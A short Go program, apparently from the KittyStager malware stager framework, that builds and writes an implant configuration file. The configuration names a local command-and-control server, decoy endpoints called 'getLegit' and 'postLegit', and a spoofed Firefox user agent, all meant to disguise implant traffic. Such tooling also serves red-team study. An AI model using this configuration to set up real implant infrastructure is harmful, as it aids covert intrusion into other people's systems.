package main

import (
	"KittyStager/kitten/malware"
	"os"
)

func main() {
	config := malware.NewConfig("http://127.0.0.1:8080",
		"getLegit",
		"postLegit",
		"reg",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/102.0",
		"",
		2,
	)
	c, err := config.MarshallConfig()
	if err != nil {
		return
	}
	err = os.WriteFile("./conf.txt", c, 0644)
	if err != nil {
		return
	}
}